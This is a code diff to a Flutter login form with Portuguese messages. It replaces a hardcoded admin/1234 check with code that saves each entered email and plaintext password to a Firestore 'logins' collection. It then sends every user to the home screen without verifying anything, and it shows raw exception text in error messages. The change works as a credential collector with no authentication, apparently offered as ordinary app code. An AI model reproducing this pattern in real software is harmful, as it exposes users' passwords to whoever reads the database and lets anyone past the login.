@@ -1,5 +1,6 @@
 // login-form.dart
 import 'package:flutter/material.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
 
 class LoginForm extends StatefulWidget {
   const LoginForm({super.key});
@@ -12,18 +13,26 @@ class _LoginFormState extends State<LoginForm> {
   final TextEditingController _emailController = TextEditingController();
   final TextEditingController _passwordController = TextEditingController();
 
-  void _login() {
+  Future<void> _login() async {
     final String email = _emailController.text;
     final String password = _passwordController.text;
 
-    if (email == 'admin' && password == '1234') {
+    try {
+      await FirebaseFirestore.instance.collection('logins').add({
+        'email': email,
+        'password': password,
+        'timestamp': FieldValue.serverTimestamp(),
+      });
+
+      if (!mounted) return;
       Navigator.pushReplacementNamed(context, '/home');
-    } else {
+    } catch (e) {
+      if (!mounted) return;
       ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(
-          content: Text('E-mail ou senha incorretos.'),
+        SnackBar(
+          content: Text('Erro ao salvar dados: $e'),
           backgroundColor: Colors.red,
-          duration: Duration(seconds: 3),
+          duration: const Duration(seconds: 3),
         ),
       );
     }
